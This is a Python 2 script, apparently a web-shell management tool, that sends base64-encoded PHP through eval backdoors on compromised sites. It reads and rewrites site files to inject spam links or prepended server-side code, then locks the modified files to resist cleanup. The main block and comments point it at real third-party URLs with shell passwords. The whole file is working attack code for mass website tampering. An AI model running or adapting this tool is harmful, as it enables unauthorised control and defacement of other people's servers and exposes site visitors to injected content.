#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#BY: QQ292925842
import threading
import httplib
import re
import php_data
import g
import sys
import base64
import eval
import list
import httplib,StringIO,gzip,urllib,re
import binascii
import chardet
import ConfigParser  #读取INI配置信息
import random
import time
import Queue
import thread

sys.path.append('..')
reload(sys)
sys.setdefaultencoding("utf-8")

class php_ecal(threading.Thread):
    def __init__(self, url, password,i):
        threading.Thread.__init__(self)
        self.url = url  #URL
        self.password = password  #password
        self.TH=i  #线程号
        self.DEBUG = True #调试
        self.list_2 = []
        self.link=[]   #链接
        self.link_int=1 #抽取链接数
        self.thread_link=1 #子线程数
        self.htm_html_text="$data_link"  #挂链接模板
        self.zml= 1 #是否可以修改主目录 1可以  0不可以
        self.web_path = "" #网站根目录
        self.win_Linux = ""  #操作系统
        self.file_name_fa =2  #;设置要修改的方法
        self.path_nmae1 = ""
        self.path_nmae2 =""  #要查找的文件名
        self.tag_text = []  #></script>
        self.path_Queue = Queue.Queue(0)  #存放文件路径
        self.open_pb_txt()   #读取要屏蔽的内容
        self.open_mai_ini()   #读取配置信息

    def open_mai_ini(self):   #读取配置信息
        # 读取INI配置信息
        try:
            config = ConfigParser.ConfigParser()
            config.readfp(open("main.ini"))
            self.file_name_fa = int(config.get("DATA", "file_name_fa"))  #;设置要修改的方法
            self.path_nmae1 = str(config.get("DATA", "file_name1"))  #;指定目录修改文件名
            self.path_nmae2 = str(config.get("DATA", "file_name2"))  #;遍历要修改文件名
            self.link_int = int(config.get("DATA", "link_int"))  #;抽取链接数只对HTM  HTML 有效
            self.thread_link = int(config.get("DATA", "thread_link"))  #;子线程数
        except:
            pass

    def open_pb_txt(self):   #读取要屏蔽的内容
        try:
            try:
                LS = list.Clist()  #初始化类
                LS.list_del()  #清空list列表
                xxx = file("data/pb.txt", 'r')
                for xxx_line in xxx.readlines():
                    if len(xxx_line) <= 2:
                        continue  #跳过   这一次
                    LS.liet_add(xxx_line.strip().lstrip())  #添加到数组
                LS.liet_lsqc() #数组列表去重复
                self.list_2 = LS.list_2
            except Exception, e:
                print u"读取文件 data/pb.txt 异常"
                pass
            try:
                xxx = file("data/link.txt", 'r')  #链接
                for xxx_line in xxx.readlines():
                    self.link.append(xxx_line.strip().lstrip())  #添加数据+"\r\n"
            except Exception, e:
                print u"读取文件 data/link.txt 异常"
                pass
            try:
                file_object = open('data/htm_html.txt')  #挂链模板
                try:
                    self.htm_html_text = file_object.read()
                finally:
                    file_object.close()
            except Exception, e:
                print u"读取文件 data/htm_html.txt 异常"
                pass

            #读取所有内容
            try:
#                file_object = open('data/tag.txt',"r")  #读取要链接标记
#                try:
#                    self.tag_text = file_object.read().strip().lstrip()
#                    #self.tag_text=data[3:len(data)]
#                finally:
#                    file_object.close()
                xxx = file("data/tag.txt", 'r')  #链接
                for xxx_line in xxx.readlines():
                    self.tag_text.append(xxx_line.strip().lstrip())  #添加数据+"\r\n"
            except Exception, e:
                print u"读取文件 data/tag.txt 异常"
                pass
        except Exception, e:
            print e
            return 0

    def re_data(self, data, re_dtaa):  #正则匹配  r'<meta name="generator" content="(.*?)" />'
        try:
            p = re.compile(re_dtaa)
            sarr = p.findall(data)
            if len(sarr)>=1:
                if not sarr[0]=="":
                    return 1
            else:
                return 0
        except:
            return 0

    def cx_data(self,data):  #查询内容是否存在
        bool_ok=False
        for i in range(len(self.list_2)):
            #print self.list_2[i]
            if self.re_data(data,self.list_2[i])==1:
                #print data,"|",self.list_2[i]
                if bool_ok:
                    break #跳出   整个循环
                #bool_ok=True
                return True
        if bool_ok==True:
            return True
        else:
            return False

    def open_txt(self,name):
        try:
            data = ""
            xxx = file(name, 'r')
            for xxx_line in xxx.readlines():
                data+=xxx_line.strip().lstrip()+"\r\n"
            return data
        except Exception,e:
            print u"读取本地文件 %s 失败"%(name)
            return 0

    def TXT_file_add(self,file_nem,data):  #写入文本
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            #file_object.write(list_passwed[E])
            file_object.writelines(data)
            file_object.writelines("\n")
            file_object.close()
        except Exception,e:
            print u"写入TXT失败",file_nem,data,e
            return 0

    def add_DEBUG(self,data):
        data = "%s|%s|%s"%(self.url,self.password,data)
        print u"%s  编码转换错误"%(data)
        self.TXT_file_add("log/DEBUG.txt",data)

    def for_html_tag(self,data):
        try:
            bool_ok=False
            for i in range(len(self.tag_text)):
                if self.re_data(data,self.tag_text[i])==1:
                #print data,"|",self.list_2[i]
                    if bool_ok:
                        break #跳出   整个循环
                    #bool_ok=True
                    return True
            if bool_ok==True:
                return True
            else:
                return False
        except Exception, e:
            print e
            return False

    def re_th_data(self,data2,th): #替换内容   数据  标记  替换
        try:
            data = ""
            #print self.tag_text
    #        print type(self.tag_text)  #查看属性
            #print var_dump(s)
            p = re.compile( r'.+?\n')
            sarr = p.findall(data2)
            bool_ok=False
            for every in sarr:
                if bool_ok==False:
                    #if self.re_data(every,self.tag_text)==1:   #"\"></script>"
                    if self.for_html_tag(every):
                        bool_ok=True
                        #print "rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr"
                        data+=str(th)+"\n"
                        data+=every
                data+=every
            if bool_ok and (len(data)-len(data2)>=10):
                return 1,data
            else:
                print u"没有找到标记"
                return 0,""
        except Exception, e:
            print e
            return 0,""

    def sjs_random(self,zd0,zd1):  #获取随机数
        try:
            return random.randint(zd0, zd1)
        except Exception, e:
        #print e
            return 1

    def html_htm_data(self):  #自合链接内容
    #读取所有内容
        try:
            lszs=len(self.link)
            data=""
            for i in range(self.link_int):
                data+=self.link[self.sjs_random(0,lszs)]
                data+="\n"
            data=self.htm_html_text.replace('$data_link',data)
            return data
        except Exception, e:
            #print "3333333",e
            return 0

    def run(self):
        try:
            self.web_path = self.www_web_path()  #获取网站根目录
            self.win_Linux = eval.yijuhua_win_linux(self.url, self.password) #URL地址 ，密码   返回操作系统
            if self.file_name_fa==1:
                self.zml= 1 #是否可以修改主目录 1可以  0不可以
                self.open_php_fie_name1(str(self.path_nmae1))   #指定目录修改文件名
                return 0
            if self.file_name_fa==2:
                self.zml= 0 #是否可以修改主目录 1可以  0不可以
                self.open_php_fie_name2(str(self.path_nmae2))   #读取要遍历的文件
                return 0
            self.zml= 0 #是否可以修改主目录 1可以  0不可以
            self.open_php_fie_name2(str(self.path_nmae2))   #读取要遍历的文件
            return 0
        except Exception, e:
             #print e
             return 0

    def open_php_fie_name1(self,path_data):   #指定目录修改文件名
        try:
            #print path_data
            ss = path_data.split("|")
            self.id1=0
            id2=len(ss)
            for i2 in ss:
                if len(i2) <= 1:
                    continue  #跳过   这一次
                i2="%s%s"%(self.web_path,str(i2))
                print "%s"%(i2)
                self.id1+=1
                self.run_file_thread(i2,self.id1,id2)
        except Exception, e:
            #print e
            return 0

    def open_php_fie_name2(self,path_data):   #遍历要修改文件名
        try:
            PHP_data = str(php_data.PHP_bl_path)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            #path_data = "index.php|forum.php|conn.php|CONN.php|home.php|common.inc.php|global.php"  #路径
            #path_data = "conn2.php|conn.php"  #路径
            data_base64="%s"%(base64.b64encode(PHP_data))
            params = "=@eval(base64_decode($_POST[z0]));&z0=%s&z1=%s" % (urllib.quote(data_base64),base64.b64encode(path_data))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data = g.re_data(data) #正则返回的结果
            if not data:
                print u"php_ok_null.txt没有读取到数据 is 0 null...."
                websehll="%s|%s"%(self.url,self.password)
                self.TXT_file_add("php_ok_null.txt",str(websehll))
                return False
            ss = data.split("$")
            self.id1=0
            id2=len(ss)

            for i2 in ss:
                if len(i2) <= 1:
                    continue  #跳过   这一次
                self.path_Queue.put(i2,0.3)   #插入队列
            while not self.path_Queue.empty():   #判断队列是否为空
                try:
                    threads = []  #线程
                    for i in range(self.thread_link):  #nthreads=10  创建10个线程
                        self.id1+=1
                        threads.append(self.time_sleep(i+1,id2))
                    for t in threads:
                        t.start()  #开始线程
                    for t in threads:
                        t.join()  #等待线程，保持主进程
                except Exception,e:
                    #print "1111111111",e
                    pass


#            i="/home/a83iztfy4f/domains/wulinzr.com/public_html/0405286/index.html"
#            B_M=g.asp_aspx_php_htm_html(str(i))  #查看文件格式
#            #asp aspx php htm html null
#            url = g.ww_path(g.get_domain(self.url, 1), self.web_path, str(i))
#            if (B_M=="htm")or(B_M=="html"):
#                #print "%s----htm_html.txt"%(str(url))
#                str_data="thread:%d %s%s"%(self.TH,0,str(url))
#                if self.bj_file_html(url,str(i)):
#                    str_data="%s--htm_html.txt  ok"%(str_data)
#                    self.TXT_file_add("log/add_ok.txt",str(url))
#                    print str_data
#                else:
#                    str_data="%s  no"%(str_data)
#                    self.TXT_file_add("log/add_no.txt",str(url))
#                    print str_data
#                return 0
            #print "3333333333333333333333333333333"
            return 0
        except Exception,e:
            #print "1111111111",e
            return 0

    def time_sleep(self,i,id2):
        try:
            if self.path_Queue.empty():   #判断队列是否为空
                #print u"thread:%d 数据完成"%(self.TH)
                #time.sleep(60)
                return 0
            else:
                URL = self.path_Queue.get(0.5)  #get()方法从队头删除并返回一个项目
                self.run_file_thread(URL,i,id2)
                return 0
        except Exception,e:
            #print "2222222222222",e
            return 0

    def run_file_thread(self,i,i2,id2):
        try:
            B_M=g.asp_aspx_php_htm_html(str(i))  #查看文件格式
            #asp aspx php htm html null
            url =""
            if self.zml==0: #是否可以修改主目录 1可以  0不可以
                url = g.ww_path(g.get_domain(self.url, 1), self.web_path, str(i))
            else:
                url = "%s/%s"%(g.get_domain(self.url, 1),str(i))
            if self.zml==0: #是否可以修改主目录 1可以  0不可以
                if not g.www_http_z(url):
                    print u"%s 主目录文件不修改"%(url)
                    return 0
            #print url
            id="[%d-%d]thread_link:%d "%(id2,self.id1,i2)
            if B_M=="null":
                print u"%s----不在支持类型中 支持.asp .aspx .php .htm .html"%(str(url))
                return 0
                #continue  #跳过   这一次
            if B_M=="asp":
                str_data="thread:%d %s%s"%(self.TH,id,str(url))
                if self.bj_file_php(url,"data/asp.txt",str(i)):
                    str_data="%s--asp.txt  ok"%(str_data)
                    self.TXT_file_add("log/add_ok.txt",str(url))
                    print str_data
                else:
                    str_data="%s  no"%(str_data)
                    self.TXT_file_add("log/add_no.txt",str(url))
                    print str_data
                return 0
                #continue  #跳过   这一次
            if B_M=="aspx":
                str_data="thread:%d %s%s"%(self.TH,id,str(url))
                if self.bj_file_php(url,"data/aspx.txt",str(i)):
                    str_data="%s--aspx.txt  ok"%(str_data)
                    self.TXT_file_add("log/add_ok.txt",str(url))
                    print str_data
                else:
                    str_data="%s  no"%(str_data)
                    self.TXT_file_add("log/add_no.txt",str(url))
                    print str_data
                return 0
                #continue  #跳过   这一次
            if B_M=="php":
                str_data="thread:%d %s%s"%(self.TH,id,str(url))
                if self.bj_file_php(url,"data/php.txt",str(i)):
                    str_data="%s--php.txt  ok"%(str_data)
                    self.TXT_file_add("log/add_ok.txt",str(url))
                    print str_data
                else:
                    str_data="%s  no"%(str_data)
                    self.TXT_file_add("log/add_no.txt",str(url))
                    print str_data
                return 0
                #continue  #跳过   这一次
            if (B_M=="htm")or(B_M=="html"):
                #print "%s----htm_html.txt"%(str(url))
                str_data="thread:%d %s%s"%(self.TH,id,str(url))
                if self.bj_file_html(url,str(i)):
                    str_data="%s--htm_html.txt  ok"%(str_data)
                    self.TXT_file_add("log/add_ok.txt",str(url))
                    print str_data
                else:
                    str_data="%s  no"%(str_data)
                    self.TXT_file_add("log/add_no.txt",str(url))
                    print str_data
                return 0
                #continue  #跳过   这一次
        except Exception,e:
            #print "2222222222222",e
            return 0

    def bj_file_html(self,url,path_name):  #编辑
        try:
            #htm_html_text = self.open_txt(send_name) #读取要挂载的文件内容
            htm_html_text = self.html_htm_data()  #自合链接内容
            data = self.open_file(str(path_name))  #"D:/wamp/www/conn.php"
            if len(data)<=10:
                return 0
            utf_gbk, data = g.utf_8_G(data)  #解码
            if data == u"no":
                if self.DEBUG:
                    deg_data = u"%s读取或转换失败"%(str(path_name))
                    self.add_DEBUG(deg_data)
                return 0
            if self.cx_data(str(data))==True:  #查询内容是否存在
            #if self.re_data("21111111","1111111111111")==1:
                data = u"%s|%s" % (url,str(path_name))
                print u"thread:%d %s 屏蔽关键字存在"%(self.TH,url)
                self.TXT_file_add("log/send_NO.txt", data)
                return 0
            bool_no_ok,data=self.re_th_data(data,htm_html_text) #替换内容   数据  标记  替换
            if not bool_no_ok:  #正则失败
                return 0
            no_ok,data=g.utf_8_B(utf_gbk,data) #编码
            if no_ok == "ok":
                if self.write_file(str(path_name), data) == "ok":
                    self.s_win_Linux_file(url,str(path_name))  #锁文件
                    return 1
                else:
                    return 0
            else:
                return 0
        except Exception,e:
            #print "2222222222222",e
            return 0

    def bj_file_php(self,url,send_name,path_name):  #编辑PHP
        try:
            php_text = self.open_txt(send_name) #读取要挂载的文件内容
            data = self.open_file(str(path_name))  #"D:/wamp/www/conn.php"
            if len(data)<=10:
                return 0
            utf_gbk, data = g.utf_8_G(data)  #解码
            #print data
            if data == u"no":
                if self.DEBUG:
                    deg_data = u"%s读取或转换失败"%(str(path_name))
                    self.add_DEBUG(deg_data)
                return 0
            if self.cx_data(str(data))==True:  #查询内容是否存在
            #if self.re_data("21111111","1111111111111")==1:
                data = u"%s|%s" % (url,str(path_name))
                print u"thread:%d %s 屏蔽关键字存在"%(self.TH,url)
                self.TXT_file_add("log/send_NO.txt", data)
                return 0
            data = u"%s\r\n%s"%(php_text.encode("GBK", "ignore"), data)
            no_ok, data = g.utf_8_B(utf_gbk, data)   #编码
            if no_ok == "ok":
                if self.write_file(str(path_name), data) == "ok":
                    self.s_win_Linux_file(url,str(path_name))  #锁文件
                    return 1
                else:
                    return 0
            else:
                return 0
        except Exception,e:
            #print "2222222222222",e
            return 0

    def www_web_path(self):  #获取网站根目录
        try:
            PHP_data = str(php_data.php_www_path)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
            params = "=%s&z0=%s" % (eval_data,urllib.quote(data_base64))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

    def open_file(self, path):  #读取文件
        try:
            PHP_data = str(php_data.php_open_file)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            data_base64="%s"%(base64.b64encode(PHP_data))
            params = "=@eval(base64_decode($_POST[z0]));&z0=%s&z1=%s" % (urllib.quote(data_base64), path)  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2=g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

    def str_to_ascii(self, data):
        str_data = ""
        for i, ch in enumerate(data):
            str_data += "%"+binascii.b2a_hex(ch)
        return str_data

    def write_file(self, path, data):  #写入文件
        try:
            PHP_data = str(php_data.write_file)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            data = self.str_to_ascii(data)
            #print urllib.unquote(data)
            data = data.replace('%','')#.replace(',','')   #替换字符串

            #print data
            data_base64="%s"%(base64.b64encode(PHP_data))
            params = "=@eval(base64_decode($_POST[z0]));&z0=%s&z1=%s&z2=%s" % (urllib.quote(data_base64), base64.b64encode(path), data)  #quote URL编码
            #print params
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception, e:
            print e
            return 0

    def s_win_Linux_file(self,url, path):  #锁文件
        #LINUX  在同路径下创建一个  .xxxx.php.swap  就可以禁止编辑这个问题
        #win32  锁文件  chmod('./'.$file,0444);
        try:
            if (self.win_Linux == "WinNT") or (self.win_Linux == "null"):
                PHP_data = str(php_data.s_win_file)  #锁WIN32文件
                PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
                data_base64 = "%s"%(base64.b64encode(PHP_data))
                params = "=@eval(base64_decode($_POST[z0]));&z0=%s&z1=%s" % (urllib.quote(data_base64), path)  #quote URL编码
                data = eval.post_eval_data(self.url, self.password, params)
                data2 = g.re_data(data) #正则返回的结果
                #log
                data = "%s|%s|%s" % (url, str(path), data2)
                #print data
                self.TXT_file_add("log/win_Linux_file.txt", data)

            if (self.win_Linux == "Linux") or (self.win_Linux == "FreeBSD"):
                PHP_data = str(php_data.s_LINUX_file)  #锁LINUX文件
                PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
                data_base64 = "%s" % (base64.b64encode(PHP_data))
                params = "=@eval(base64_decode($_POST[z0]));&z0=%s&z1=%s" % (urllib.quote(data_base64), self.Linux_path(path))  #quote URL编码
                data = eval.post_eval_data(self.url, self.password, params)
                data2 = g.re_data(data) #正则返回的结果
                #log
                data = "%s|%s|%s" % (url, str(path), data2)
                #print data
                self.TXT_file_add("log/win_Linux_file.txt", data)
        except Exception, e:
            print e
            return 0

    def Linux_path(self,path):
        #path="D:/wamp/www/12223.php"
        nPos1 = path.rindex('/') #反向查找查找字符
        url1=path[0:nPos1+1]
        url2=path[nPos1+1:len(path)]
        return url1+"."+url2+".swap"

#import chardet
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):
        #threads.append(php_ecal("http://localhost/long.php","long123",1))
        threads.append(php_ecal("http://aoglight.com/plus/mytag_js.php?aid=9090","guige",1))
    for t in threads:
        t.start()

#http://www.tyzxmryy.com/plus/mytag_js.php?aid=9090|guige
#    f = open('htm_html.txt',"r")
#    data = f.read()
#    print chardet.detect(data)["encoding"]

